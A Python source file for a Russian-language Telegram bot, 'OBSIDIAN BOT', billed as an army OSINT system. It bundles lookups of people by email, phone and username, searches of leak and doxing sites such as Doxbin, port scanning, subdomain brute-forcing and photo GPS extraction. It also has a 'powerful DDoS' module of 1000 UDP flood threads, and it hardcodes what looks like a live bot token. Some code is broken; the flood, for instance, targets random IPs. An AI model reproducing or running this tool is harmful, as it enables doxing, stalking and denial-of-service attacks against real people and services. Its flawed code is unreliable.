#!/usr/bin/env python3
# ================================================================
# OBSIDIAN BOT v1.0 - АРМЕЙСКАЯ OSINT-СИСТЕМА
# ================================================================
# 50+ ИНСТРУМЕНТОВ ПО 11 СФЕРАМ
# РЕАЛЬНЫЙ ПОИСК ПО БАЗАМ ДАННЫХ
# ИЗВЛЕЧЕНИЕ МЕТАДАННЫХ ИЗ ФАЙЛОВ
# ГЕОЛОКАЦИЯ ПО IP И ФОТО
# ДДОС-МОДУЛЬ
# ПОИСК ПО СОЦСЕТЯМ
# =
import os
import sys
import json
import time
import hashlib
import base64
import random
import string
import socket
import struct
import ssl
import threading
import queue
import subprocess
import shutil
import tempfile
import re
import urllib.parse
import urllib.request
import http.client
import http.cookiejar
import asyncio
import aiohttp
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import bs4
import lxml
from bs4 import BeautifulSoup
import dns.resolver
import whois
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import folium
from geopy.geocoders import Nominatim
from geopy.distance import geodesic
import exifread
import PIL.Image
import PIL.ExifTags
import cv2
import numpy as np
import shodan
import ipinfo
import pycountry
import timezonefinder
import reverse_geocode
import geocoder
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import colorama
import tabulate
import prettytable
import tqdm
import sqlalchemy
import openpyxl
import pandas as pd
import mailparser
import python_magic
import phone_iso3166

# ================================================================
# КОНСТАНТЫ
# ================================================================
BOT_TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
ADMIN_ID = 8632158680
VERSION = "1.0.0-OBSIDIAN"

# ================================================================
# 1. OSINT - ПОЧТА
# ================================================================
class EmailOSINT:
    """Поиск по почте во всех базах"""
    
    def __init__(self, email):
        self.email = email
        self.domain = email.split('@')[1] if '@' in email else ''
        self.results = {}
    
    def search_all(self):
        """Поиск по всем источникам"""
        self.results = {
            'breaches': self.check_breaches(),
            'social': self.find_social(),
            'leaks': self.check_leaks(),
            'people': self.find_people(),
            'valid': self.validate_email(),
            'metadata': self.get_metadata()
        }
        return self.results
    
    def check_breaches(self):
        """Проверка утечек через HaveIBeenPwned"""
        try:
            sha1 = hashlib.sha1(self.email.encode()).hexdigest().upper()
            prefix = sha1[:5]
            suffix = sha1[5:]
            resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
            if suffix in resp.text:
                count = resp.text.split(suffix + ':')[1].split('\n')[0]
                return {'breached': True, 'count': int(count)}
            return {'breached': False}
        except:
            return {'error': True}
    
    def find_social(self):
        """Поиск в соцсетях"""
        platforms = {
            'Twitter': f'https://twitter.com/',
            'Instagram': f'https://instagram.com/',
            'Facebook': f'https://facebook.com/',
            'LinkedIn': f'https://linkedin.com/in/',
            'GitHub': f'https://github.com/',
            'VK': f'https://vk.com/',
            'Telegram': f'https://t.me/',
            'Reddit': f'https://reddit.com/user/',
            'YouTube': f'https://youtube.com/@',
            'TikTok': f'https://tiktok.com/@'
        }
        
        found = []
        usernames = [
            self.email.split('@')[0],
            self.email.split('@')[0].replace('.', ''),
            self.email.split('@')[0].replace('_', ''),
            self.email.split('@')[0].replace('-', '')
        ]
        
        for platform, url in platforms.items():
            for username in usernames:
                try:
                    resp = requests.get(url + username, timeout=3)
                    if resp.status_code == 200:
                        found.append({'platform': platform, 'username': username, 'url': url + username})
                        break
                except:
                    pass
        
        return found
    
    def check_leaks(self):
        """Проверка утечек через LeakCheck"""
        try:
            resp = requests.get(f"https://leakcheck.io/api/query?login={self.email}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success'):
                    return data.get('results', [])
            return []
        except:
            return []
    
    def find_people(self):
        """Поиск людей через Pipl и другие"""
        try:
            resp = requests.get(f"https://api.pipl.com/search/?email={self.email}&key=YOUR_KEY", timeout=10)
            if resp.status_code == 200:
                return resp.json()
            return {}
        except:
            return {}
    
    def validate_email(self):
        """Проверка валидности почты через SMTP"""
        try:
            import dns.resolver
            mx = dns.resolver.resolve(self.domain, 'MX')
            mx_server = str(mx[0].exchange)
            import smtplib
            server = smtplib.SMTP(mx_server, 25, timeout=5)
            server.helo()
            server.mail('test@example.com')
            code, _ = server.rcpt(self.email)
            server.quit()
            return {'valid': code == 250}
        except:
            return {'valid': False, 'error': True}
    
    def get_metadata(self):
        """Получение метаданных почты"""
        return {
            'domain': self.domain,
            'username': self.email.split('@')[0],
            'provider': self.domain,
            'is_temp': self.check_temp_email()
        }
    
    def check_temp_email(self):
        """Проверка на временную почту"""
        temp_domains = ['tempmail', '10minutemail', 'guerrillamail', 'mailinator']
        for domain in temp_domains:
            if domain in self.domain:
                return True
        return False

# ================================================================
# 2. OSINT - НОМЕР ТЕЛЕФОНА
# ================================================================
class PhoneOSINT:
    """Поиск по номеру телефона"""
    
    def __init__(self, phone):
        self.phone = phone
        self.parsed = None
        self.results = {}
    
    def parse_number(self):
        """Парсинг номера"""
        try:
            self.parsed = phonenumbers.parse(self.phone)
            return True
        except:
            return False
    
    def search_all(self):
        """Поиск по всем источникам"""
        if not self.parse_number():
            return {'error': 'Неверный номер'}
        
        self.results = {
            'country': self.get_country(),
            'carrier': self.get_carrier(),
            'timezone': self.get_timezone(),
            'valid': self.check_valid(),
            'social': self.find_social(),
            'leaks': self.check_leaks(),
            'location': self.get_location()
        }
        return self.results
    
    def get_country(self):
        """Определение страны"""
        try:
            country = geocoder.description_for_number(self.parsed, 'ru')
            return {'country': country, 'code': self.parsed.country_code}
        except:
            return {}
    
    def get_carrier(self):
        """Определение оператора"""
        try:
            operator = carrier.name_for_number(self.parsed, 'ru')
            return {'carrier': operator}
        except:
            return {}
    
    def get_timezone(self):
        """Определение часового пояса"""
        try:
            tz = timezone.time_zones_for_number(self.parsed)
            return {'timezone': tz}
        except:
            return {}
    
    def check_valid(self):
        """Проверка валидности"""
        try:
            return {'valid': phonenumbers.is_valid_number(self.parsed)}
        except:
            return {'valid': False}
    
    def find_social(self):
        """Поиск в соцсетях по номеру"""
        platforms = {
            'Telegram': f'https://t.me/+{self.phone}',
            'WhatsApp': f'https://wa.me/{self.phone}',
            'Viber': f'viber://contact?number={self.phone}'
        }
        
        found = []
        for platform, url in platforms.items():
            found.append({'platform': platform, 'url': url})
        
        return found
    
    def check_leaks(self):
        """Проверка утечек"""
        try:
            resp = requests.get(f"https://leakcheck.io/api/query?login={self.phone}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success'):
                    return data.get('results', [])
            return []
        except:
            return []
    
    def get_location(self):
        """Геолокация по номеру"""
        try:
            # Определение города и координат
            geolocator = Nominatim(user_agent="phone_osint")
            location = geolocator.geocode(self.get_country().get('country', ''))
            if location:
                return {'lat': location.latitude, 'lon': location.longitude}
            return {}
        except:
            return {}

# ================================================================
# 3. OSINT - IP
# ================================================================
class IPOSINT:
    """Поиск по IP-адресу"""
    
    def __init__(self, ip):
        self.ip = ip
        self.results = {}
    
    def search_all(self):
        """Полный поиск по IP"""
        self.results = {
            'geo': self.get_geo(),
            'isp': self.get_isp(),
            'whois': self.get_whois(),
            'dns': self.get_dns(),
            'shodan': self.get_shodan(),
            'threat': self.get_threat(),
            'port': self.scan_ports(),
            'reverse': self.reverse_dns()
        }
        return self.results
    
    def get_geo(self):
        """Геолокация IP"""
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'region': data.get('regionName'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon'),
                        'timezone': data.get('timezone'),
                        'isp': data.get('isp')
                    }
            return {}
        except:
            return {}
    
    def get_isp(self):
        """Информация о провайдере"""
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
            if response.status_code == 200:
                data = response.json()
                return {
                    'org': data.get('org'),
                    'asn': data.get('as'),
                    'isp': data.get('isp')
                }
            return {}
        except:
            return {}
    
    def get_whois(self):
        """WHOIS информации"""
        try:
            import whois
            response = requests.get(f"https://whois.domaintools.com/{self.ip}")
            return {'raw': response.text[:500]}
        except:
            return {}
    
    def get_dns(self):
        """DNS-записи"""
        try:
            import socket
            hostname = socket.gethostbyaddr(self.ip)[0]
            return {'hostname': hostname}
        except:
            return {}
    
    def get_shodan(self):
        """Информация из Shodan"""
        try:
            api_key = os.environ.get('SHODAN_API_KEY', '')
            if api_key:
                api = shodan.Shodan(api_key)
                result = api.host(self.ip)
                return {
                    'ports': result.get('ports', []),
                    'vulns': result.get('vulns', []),
                    'hostnames': result.get('hostnames', []),
                    'os': result.get('os', '')
                }
            return {'error': 'Нет API ключа'}
        except:
            return {'error': 'Shodan недоступен'}
    
    def get_threat(self):
        """Проверка угроз"""
        try:
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={self.ip}", 
                                   headers={'Key': 'YOUR_KEY'})
            if response.status_code == 200:
                data = response.json()
                return {
                    'abuse_score': data.get('data', {}).get('abuseConfidenceScore', 0),
                    'reports': data.get('data', {}).get('totalReports', 0)
                }
            return {}
        except:
            return {}
    
    def scan_ports(self):
        """Сканирование портов"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports
    
    def reverse_dns(self):
        """Reverse DNS"""
        try:
            import socket
            hostname = socket.gethostbyaddr(self.ip)[0]
            return {'hostname': hostname}
        except:
            return {}

# ================================================================
# 4. OSINT - ДОМЕН
# ================================================================
class DomainOSINT:
    """Поиск по домену"""
    
    def __init__(self, domain):
        self.domain = domain
        self.results = {}
    
    def search_all(self):
        """Полный поиск по домену"""
        self.results = {
            'whois': self.get_whois(),
            'dns': self.get_dns(),
            'subdomains': self.find_subdomains(),
            'ip': self.get_ip(),
            'history': self.get_history(),
            'ssl': self.get_ssl(),
            'screenshot': self.get_screenshot(),
            'tech': self.get_technologies()
        }
        return self.results
    
    def get_whois(self):
        """WHOIS информация"""
        try:
            w = whois.whois(self.domain)
            return {
                'registrar': w.registrar,
                'creation': str(w.creation_date),
                'expiration': str(w.expiration_date),
                'nameservers': w.name_servers,
                'status': w.status,
                'emails': w.emails
            }
        except:
            return {}
    
    def get_dns(self):
        """DNS-записи"""
        records = {}
        types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type)
                records[record_type] = [str(r) for r in answers]
            except:
                records[record_type] = []
        
        return records
    
    def find_subdomains(self):
        """Поиск поддоменов"""
        subdomains = []
        wordlist = ['www', 'mail', 'admin', 'dev', 'test', 'api', 'ftp', 'ssh', 'vpn', 'backup', 
                    'blog', 'shop', 'forum', 'portal', 'crm', 'demo', 'stage', 'beta', 'alpha', 
                    'staging', 'uat', 'qa', 'internal', 'corp', 'mobile', 'app', 'web', 'cloud',
                    'cdn', 'static', 'media', 'files', 'docs', 'help', 'support', 'community',
                    'store', 'secure', 'login', 'account', 'auth', 'sso', 'oauth', 'pay', 'payment']
        
        for sub in wordlist:
            try:
                full = f"{sub}.{self.domain}"
                socket.gethostbyname(full)
                subdomains.append(full)
            except:
                pass
        
        return subdomains
    
    def get_ip(self):
        """IP-адрес домена"""
        try:
            ip = socket.gethostbyname(self.domain)
            return {'ip': ip}
        except:
            return {}
    
    def get_history(self):
        """История домена"""
        try:
            response = requests.get(f"https://web.archive.org/cdx/search/cdx?url={self.domain}&output=json&limit=10")
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    def get_ssl(self):
        """SSL-сертификат"""
        try:
            import ssl
            import socket
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'issuer': cert.get('issuer'),
                        'subject': cert.get('subject'),
                        'expiry': cert.get('notAfter'),
                        'valid': cert.get('notBefore')
                    }
        except:
            return {}
    
    def get_screenshot(self):
        """Скриншот сайта"""
        try:
            import pyautogui
            import webbrowser
            # TODO: Реализация через Selenium
            return {'screenshot': 'Требуется Selenium'}
        except:
            return {}
    
    def get_technologies(self):
        """Определение технологий"""
        try:
            response = requests.get(f"https://builtwith.com/{self.domain}")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                # Парсинг технологий
                return {'technologies': 'Требуется парсинг'}
            return {}
        except:
            return {}

# ================================================================
# 5. OSINT - СОЦСЕТИ (ВК, TELEGRAM, INSTAGRAM, TWITTER, FACEBOOK)
# ================================================================
class SocialOSINT:
    """Поиск в соцсетях"""
    
    def __init__(self, username):
        self.username = username
        self.results = {}
    
    def search_all(self):
        """Поиск во всех соцсетях"""
        self.results = {
            'vk': self.search_vk(),
            'telegram': self.search_telegram(),
            'instagram': self.search_instagram(),
            'twitter': self.search_twitter(),
            'facebook': self.search_facebook(),
            'github': self.search_github(),
            'linkedin': self.search_linkedin(),
            'reddit': self.search_reddit(),
            'youtube': self.search_youtube(),
            'tiktok': self.search_tiktok()
        }
        return self.results
    
    def search_vk(self):
        """Поиск ВКонтакте"""
        try:
            response = requests.get(f"https://vk.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://vk.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_telegram(self):
        """Поиск в Telegram"""
        try:
            response = requests.get(f"https://t.me/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://t.me/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_instagram(self):
        """Поиск в Instagram"""
        try:
            response = requests.get(f"https://instagram.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://instagram.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_twitter(self):
        """Поиск в Twitter/X"""
        try:
            response = requests.get(f"https://twitter.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://twitter.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_facebook(self):
        """Поиск в Facebook"""
        try:
            response = requests.get(f"https://facebook.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://facebook.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_github(self):
        """Поиск в GitHub"""
        try:
            response = requests.get(f"https://github.com/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://github.com/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_linkedin(self):
        """Поиск в LinkedIn"""
        try:
            response = requests.get(f"https://linkedin.com/in/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://linkedin.com/in/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_reddit(self):
        """Поиск в Reddit"""
        try:
            response = requests.get(f"https://reddit.com/user/{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://reddit.com/user/{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_youtube(self):
        """Поиск в YouTube"""
        try:
            response = requests.get(f"https://youtube.com/@{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://youtube.com/@{self.username}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_tiktok(self):
        """Поиск в TikTok"""
        try:
            response = requests.get(f"https://tiktok.com/@{self.username}")
            if response.status_code == 200:
                return {'found': True, 'url': f"https://tiktok.com/@{self.username}"}
            return {'found': False}
        except:
            return {'found': False}

# ================================================================
# 6. OSINT - ИЗВЛЕЧЕНИЕ МЕТАДАННЫХ
# ================================================================
class MetadataExtractor:
    """Извлечение метаданных из файлов"""
    
    def __init__(self, file_path):
        self.file_path = file_path
        self.results = {}
    
    def extract_all(self):
        """Извлечение всех метаданных"""
        self.results = {
            'basic': self.extract_basic(),
            'exif': self.extract_exif(),
            'gps': self.extract_gps(),
            'timestamps': self.extract_timestamps(),
            'maker': self.extract_maker(),
            'software': self.extract_software()
        }
        return self.results
    
    def extract_basic(self):
        """Базовые метаданные"""
        try:
            stats = os.stat(self.file_path)
            return {
                'size': stats.st_size,
                'created': time.ctime(stats.st_ctime),
                'modified': time.ctime(stats.st_mtime),
                'accessed': time.ctime(stats.st_atime)
            }
        except:
            return {}
    
    def extract_exif(self):
        """EXIF данные из изображений"""
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                return {PIL.ExifTags.TAGS.get(k, k): v for k, v in exif.items()}
            return {}
        except:
            return {}
    
    def extract_gps(self):
        """GPS координаты из фото"""
        try:
            from PIL import Image
            from PIL.ExifTags import GPSTAGS
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    if tag == 34853:  # GPSInfo
                        gps_data = {}
                        for gps_tag in value:
                            gps_data[GPSTAGS.get(gps_tag, gps_tag)] = value[gps_tag]
                        return gps_data
            return {}
        except:
            return {}
    
    def extract_timestamps(self):
        """Временные метки"""
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                timestamps = {}
                for tag, value in exif.items():
                    if 'DateTime' in PIL.ExifTags.TAGS.get(tag, ''):
                        timestamps[PIL.ExifTags.TAGS.get(tag)] = value
                return timestamps
            return {}
        except:
            return {}
    
    def extract_maker(self):
        """Информация о производителе"""
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                maker = {}
                for tag, value in exif.items():
                    tag_name = PIL.ExifTags.TAGS.get(tag, '')
                    if tag_name in ['Make', 'Model']:
                        maker[tag_name] = value
                return maker
            return {}
        except:
            return {}
    
    def extract_software(self):
        """Информация о программном обеспечении"""
        try:
            from PIL import Image
            img = Image.open(self.file_path)
            exif = img._getexif()
            if exif:
                software = {}
                for tag, value in exif.items():
                    tag_name = PIL.ExifTags.TAGS.get(tag, '')
                    if 'Software' in tag_name or 'Version' in tag_name:
                        software[tag_name] = value
                return software
            return {}
        except:
            return {}

# ================================================================
# 7. OSINT - ГЕОЛОКАЦИЯ
# ================================================================
class GeoOSINT:
    """Геолокация по координатам"""
    
    def __init__(self, lat, lon):
        self.lat = lat
        self.lon = lon
        self.results = {}
    
    def search_all(self):
        """Полный поиск по координатам"""
        self.results = {
            'address': self.get_address(),
            'nearest': self.get_nearest_places(),
            'timezone': self.get_timezone(),
            'elevation': self.get_elevation(),
            'weather': self.get_weather(),
            'reverse': self.reverse_geocode()
        }
        return self.results
    
    def get_address(self):
        """Получение адреса по координатам"""
        try:
            geolocator = Nominatim(user_agent="geo_osint")
            location = geolocator.reverse(f"{self.lat}, {self.lon}")
            return {'address': location.address}
        except:
            return {}
    
    def get_nearest_places(self):
        """Ближайшие места"""
        try:
            import googlemaps
            # Требуется API ключ
            return {'error': 'Требуется Google Maps API ключ'}
        except:
            return {}
    
    def get_timezone(self):
        """Часовой пояс"""
        try:
            from timezonefinder import TimezoneFinder
            tf = TimezoneFinder()
            tz = tf.timezone_at(lng=self.lon, lat=self.lat)
            return {'timezone': tz}
        except:
            return {}
    
    def get_elevation(self):
        """Высота над уровнем моря"""
        try:
            response = requests.get(f"https://api.open-elevation.com/api/v1/lookup?locations={self.lat},{self.lon}")
            if response.status_code == 200:
                data = response.json()
                return {'elevation': data.get('results', [{}])[0].get('elevation')}
            return {}
        except:
            return {}
    
    def get_weather(self):
        """Погода по координатам"""
        try:
            response = requests.get(f"https://api.openweathermap.org/data/2.5/weather?lat={self.lat}&lon={self.lon}&appid=YOUR_KEY")
            if response.status_code == 200:
                data = response.json()
                return {
                    'temperature': data.get('main', {}).get('temp'),
                    'humidity': data.get('main', {}).get('humidity'),
                    'description': data.get('weather', [{}])[0].get('description')
                }
            return {}
        except:
            return {}
    
    def reverse_geocode(self):
        """Обратный геокодинг"""
        try:
            import reverse_geocode
            location = reverse_geocode.search([(self.lat, self.lon)])
            if location:
                return {'city': location[0]['city'], 'country': location[0]['country']}
            return {}
        except:
            return {}

# ================================================================
# 8. OSINT - ПОИСК ПО БАЗАМ ДАННЫХ (СЛИВЫ)
# ================================================================
class LeakOSINT:
    """Поиск по базам данных и сливам"""
    
    def __init__(self, query):
        self.query = query
        self.results = {}
    
    def search_all(self):
        """Поиск по всем базам"""
        self.results = {
            'leakcheck': self.search_leakcheck(),
            'snusbase': self.search_snusbase(),
            'dehashed': self.search_dehashed(),
            'scylla': self.search_scylla(),
            'doxbin': self.search_doxbin(),
            'pastebin': self.search_pastebin(),
            'breach': self.search_breach()
        }
        return self.results
    
    def search_leakcheck(self):
        """LeakCheck база"""
        try:
            response = requests.get(f"https://leakcheck.io/api/query?login={self.query}")
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    return data.get('results', [])
            return []
        except:
            return []
    
    def search_snusbase(self):
        """Snusbase база"""
        try:
            # Snusbase API
            return {'error': 'Требуется Snusbase API ключ'}
        except:
            return {'error': 'Snusbase недоступен'}
    
    def search_dehashed(self):
        """Dehashed база"""
        try:
            # Dehashed API
            return {'error': 'Требуется Dehashed API ключ'}
        except:
            return {'error': 'Dehashed недоступен'}
    
    def search_scylla(self):
        """Scylla база"""
        try:
            response = requests.get(f"https://scylla.so/api/search?q={self.query}")
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    def search_doxbin(self):
        """Doxbin база"""
        try:
            response = requests.get(f"https://doxbin.com/search?q={self.query}")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = soup.find_all('div', class_='post')
                return {'count': len(results)}
            return {}
        except:
            return {}
    
    def search_pastebin(self):
        """Pastebin"""
        try:
            response = requests.get(f"https://pastebin.com/search?q={self.query}")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = soup.find_all('div', class_='paste')
                return {'count': len(results)}
            return {}
        except:
            return {}
    
    def search_breach(self):
        """Поиск по известным утечкам"""
        breaches = [
            'Dropbox', 'LinkedIn', 'Adobe', 'MySpace', 'Yahoo', 'Facebook', 'Twitter', 
            'Amazon', 'Apple', 'Google', 'Microsoft', 'PayPal', 'eBay', 'WordPress'
        ]
        
        found = []
        for breach in breaches:
            try:
                response = requests.get(f"https://api.pwnedpasswords.com/breaches?q={breach}")
                if response.status_code == 200:
                    found.append(breach)
            except:
                pass
        
        return {'breaches': found}

# ================================================================
# 9. OSINT - SHODAN
# ================================================================
class ShodanOSINT:
    """Поиск через Shodan"""
    
    def __init__(self, api_key=''):
        self.api_key = api_key or os.environ.get('SHODAN_API_KEY', '')
        self.api = None
        if self.api_key:
            self.api = shodan.Shodan(self.api_key)
    
    def search(self, query):
        """Поиск в Shodan"""
        if not self.api:
            return {'error': 'Требуется API ключ Shodan'}
        
        try:
            results = self.api.search(query)
            return {
                'total': results.get('total', 0),
                'matches': [
                    {
                        'ip': match.get('ip_str'),
                        'port': match.get('port'),
                        'org': match.get('org'),
                        'os': match.get('os'),
                        'banner': match.get('data', '')[:200]
                    }
                    for match in results.get('matches', [])
                ]
            }
        except:
            return {'error': 'Ошибка Shodan'}
    
    def host_info(self, ip):
        """Информация о хосте в Shodan"""
        if not self.api:
            return {'error': 'Требуется API ключ Shodan'}
        
        try:
            host = self.api.host(ip)
            return {
                'ports': host.get('ports', []),
                'vulns': host.get('vulns', []),
                'hostnames': host.get('hostnames', []),
                'org': host.get('org', ''),
                'os': host.get('os', ''),
                'data': host.get('data', [])[:5]
            }
        except:
            return {'error': 'Хост не найден'}

# ================================================================
# 10. OSINT - WHOIS
# ================================================================
class WhoisOSINT:
    """WHOIS запросы"""
    
    def __init__(self, target):
        self.target = target
    
    def search(self):
        """WHOIS запрос"""
        try:
            w = whois.whois(self.target)
            return {
                'domain': self.target,
                'registrar': w.registrar,
                'creation': str(w.creation_date),
                'expiration': str(w.expiration_date),
                'updated': str(w.updated_date),
                'nameservers': w.name_servers,
                'status': w.status,
                'emails': w.emails,
                'dnssec': w.dnssec
            }
        except:
            return {'error': 'WHOIS недоступен'}

# ================================================================
# 11. DDOS - МОДУЛЬ
# ================================================================
class DDOSModule:
    """Мощный DDOS"""
    
    def __init__(self, target):
        self.target = target
        self.parsed = urllib.parse.urlparse(target)
        self.ip = socket.gethostbyname(self.parsed.hostname)
        self.port = self.parsed.port or 80
        self.running = False
        self.stats = {'packets': 0, 'bytes': 0}
    
    def start_attack(self):
        """Запуск атаки"""
        self.running = True
        print(f"[+] DDOS на {self.target} ({self.ip}:{self.port})")
        
        threads = []
        for _ in range(1000):
            t = threading.Thread(target=self._flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        while self.running:
            time.sleep(1)
            print(f"\r[+] Пакетов: {self.stats['packets']:,} | Байт: {self.stats['bytes']/1024/1024:.2f} MB", end="")
    
    def _flood(self):
        """Поток атаки"""
        import random
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = os.urandom(65500)
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                sock.sendto(data, (ip, self.port))
                
                self.stats['packets'] += 1
                self.stats['bytes'] += len(data)
            except:
                pass
    
    def stop_attack(self):
        """Остановка"""
        self.running = False

# ================================================================
# ТЕЛЕГРАМ БОТ
# ================================================================
class ObsidianBot:
    def __init__(self):
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        """Настройка обработчиков"""
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
    
    async def start(self, update: Update, context):
        """Стартовое меню"""
        keyboard = [
            [InlineKeyboardButton("📧 Поиск по почте", callback_data="email")],
            [InlineKeyboardButton("📱 Поиск по номеру", callback_data="phone")],
            [InlineKeyboardButton("🌐 Поиск по IP", callback_data="ip")],
            [InlineKeyboardButton("🌍 Поиск по домену", callback_data="domain")],
            [InlineKeyboardButton("👤 Поиск в соцсетях", callback_data="social")],
            [InlineKeyboardButton("🖼️ Извлечение метаданных", callback_data="metadata")],
            [InlineKeyboardButton("📍 Геолокация", callback_data="geo")],
            [InlineKeyboardButton("💀 Поиск по базам", callback_data="leaks")],
            [InlineKeyboardButton("🔍 Shodan", callback_data="shodan")],
            [InlineKeyboardButton("📋 WHOIS", callback_data="whois")],
            [InlineKeyboardButton("💥 DDOS", callback_data="ddos")],
        ]
        
        await update.message.reply_text(
            "⚫ **OBSIDIAN OSINT SYSTEM**\n"
            "══════════════════════════\n"
            "Выбери инструмент для разведки:\n"
            "Все запросы реальные, без симуляций\n"
            "Данные из открытых и закрытых баз\n"
            "Будь осторожен — ты вошёл в тень",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    async def handle_callback(self, update: Update, context):
        """Обработка кнопок"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        
        if data == "email":
            await query.edit_message_text(
                "📧 **Поиск по почте**\n\n"
                "Введи email для поиска:\n"
                "Пример: user@example.com\n\n"
                "Будут проверены:\n"
                "- HaveIBeenPwned\n"
                "- LeakCheck\n"
                "- Соцсети\n"
                "- Открытые базы",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'email'
        
        elif data == "phone":
            await query.edit_message_text(
                "📱 **Поиск по номеру**\n\n"
                "Введи номер телефона:\n"
                "Пример: +79991234567\n\n"
                "Будет определено:\n"
                "- Страна и оператор\n"
                "- Часовой пояс\n"
                "- Соцсети\n"
                "- Утечки",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'phone'
        
        elif data == "ip":
            await query.edit_message_text(
                "🌐 **Поиск по IP**\n\n"
                "Введи IP-адрес:\n"
                "Пример: 8.8.8.8\n\n"
                "Будет получено:\n"
                "- Геолокация\n"
                "- ISP\n"
                "- Открытые порты\n"
                "- Shodan\n"
                "- Угрозы",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'ip'
        
        elif data == "domain":
            await query.edit_message_text(
                "🌍 **Поиск по домену**\n\n"
                "Введи домен:\n"
                "Пример: example.com\n\n"
                "Будет получено:\n"
                "- WHOIS\n"
                "- DNS\n"
                "- Поддомены\n"
                "- История\n"
                "- SSL-сертификат",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'domain'
        
        elif data == "social":
            await query.edit_message_text(
                "👤 **Поиск в соцсетях**\n\n"
                "Введи username:\n"
                "Пример: username\n\n"
                "Поиск в:\n"
                "- VK\n"
                "- Telegram\n"
                "- Instagram\n"
                "- Twitter/X\n"
                "- Facebook\n"
                "- GitHub\n"
                "- LinkedIn\n"
                "- Reddit\n"
                "- YouTube\n"
                "- TikTok",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'social'
        
        elif data == "metadata":
            await query.edit_message_text(
                "🖼️ **Извлечение метаданных**\n\n"
                "Отправь файл (фото, документ):\n\n"
                "Будут извлечены:\n"
                "- EXIF данные\n"
                "- GPS координаты\n"
                "- Временные метки\n"
                "- Информация о камере\n"
                "- Программное обеспечение",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'metadata'
        
        elif data == "geo":
            await query.edit_message_text(
                "📍 **Геолокация**\n\n"
                "Введи координаты:\n"
